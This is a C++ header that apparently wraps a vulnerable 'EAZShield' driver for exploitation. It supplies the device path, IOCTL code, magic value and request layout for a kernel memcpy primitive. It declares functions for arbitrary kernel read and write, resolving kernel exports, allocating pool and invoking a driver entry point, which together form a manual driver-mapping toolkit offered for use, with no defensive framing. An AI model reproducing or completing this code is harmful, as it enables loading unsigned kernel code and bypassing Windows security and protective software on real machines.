#pragma once
#include <Windows.h>
#include <winternl.h>
#include <cstdint>
#include <string>
#include <vector>

#define SHIELD_DEVICE_NAME    L"\\\\.\\EAZShield"
#define SHIELD_IOCTL_CODE     0x96102014
#define SHIELD_MAGIC          0x444D4377
#define SHIELD_SUBCODE_MEMCPY 0xf0016

#pragma pack(push, 1)
struct SHIELD_REQUEST {
    uint32_t magic;
    uint32_t subcode;
    uint64_t destination;
    uint64_t source;
    uint64_t length;
};
#pragma pack(pop)

namespace ShieldDriver {

    HANDLE  Open();
    void    Close(HANDLE hDevice);

    bool    KernelMemcpy(HANDLE hDevice, uint64_t dest, uint64_t src, uint64_t size);
    bool    ReadKernel(HANDLE hDevice, uint64_t kernelAddr, void* userBuf, uint64_t size);
    bool    WriteKernel(HANDLE hDevice, uint64_t kernelAddr, const void* userBuf, uint64_t size);

    uint64_t GetNtoskrnlBase();
    uint64_t GetKernelModuleBase(const char* moduleName);
    uint64_t GetKernelExport(HANDLE hDevice, uint64_t moduleBase, const char* funcName);

    uint64_t AllocatePool(HANDLE hDevice, uint64_t size);
    bool     FreePool(HANDLE hDevice, uint64_t address);

    bool     CallDriverEntry(HANDLE hDevice, uint64_t entryPoint, uint64_t driverBase);
}
